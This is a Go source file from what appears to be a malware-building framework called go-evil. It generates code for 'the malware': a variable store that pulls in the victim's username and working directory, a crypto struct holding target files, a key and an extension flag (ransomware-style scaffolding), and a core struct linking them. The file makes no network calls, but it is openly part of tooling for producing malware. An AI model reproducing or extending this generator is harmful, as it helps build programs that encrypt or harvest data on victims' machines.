package parsing

import "github.com/TeamPhoneix/go-evil/utility/structure"

//
//
// Generates the runtime variable struct (read rib) of the malware
//
//
func generate_runtime_variable(s_json string) string {
	data_object := structure.Receive(s_json)

	data_object.Add_go_struct([]string{
		"type var_t struct {",
		"values  []string",
		"foreach string",
		"roof int",
		"pointer int",
		"}"})

	data_object.Add_go_function([]string{
		"func (obj *var_t) set(value string) {",
		"obj.values[obj.pointer] = value",
		"obj.pointer++",
		"if obj.pointer >= obj.roof {",
		"obj.pointer = 0",
		"}}"})

	data_object.Add_go_function([]string{
		"func (obj *var_t) get(line string) string {",
		"regex := regexp.MustCompile(GRAB_VAR)",
		"result := regex.FindAllStringSubmatch(line, -1)",
		"toReturn := line",

		"if len(result) > 0 {",

		"i_number := tools.String_to_int(result[0][1])",
		"if i_number != -1 {",
		"if i_number > 0 && i_number < 5 {",
		"toReturn = obj.get(line)",
		"}else if i_number == 666 { toReturn = tools.Grab_username()",
		"} else if i_number == 39 { toReturn = tools.Grab_CWD()",
		"} else if i_number == 13 { toReturn = obj.foreach",
		"} else { toReturn = \"NULL\" }}}",
		"return toReturn }"})

	data_object.Add_go_import("github.com/TeamPhoneix/go-evil/utility/tools")
	data_object.Add_go_import("regexp")

	data_object.Add_go_const("GRAB_VAR = \"€([0-9]+)€\"")

	return structure.Send(data_object)
}

//
//
// Generates the crypto struct (read rib) of the malware
//
//
func generate_crypt(s_json string) string {
	data_object := structure.Receive(s_json)

	data_object.Add_go_struct([]string{
		"type crypt_t struct {",
		"crypto_method string",
		"target []string",
		"key string",
		"extension bool",
		"}"})

	data_object.Add_go_function([]string{
		"func (obj *crypt_t) set_crypto(value string) {",
		"obj.crypto_method = value",
		"}"})

	return structure.Send(data_object)
}

//
//
// Generates the core struct (read spine) of each malware
//
//
func generate_spine(s_json string) string {
	data_object := structure.Receive(s_json)

	data_object.Add_go_struct([]string{
		"type spine_t struct {",
		"variable  var_t",
		"crypt crypt_t",
		"path string",
		"}"})

	data_object.Add_go_global("var spine spine_t")
	return structure.Send(data_object)

}
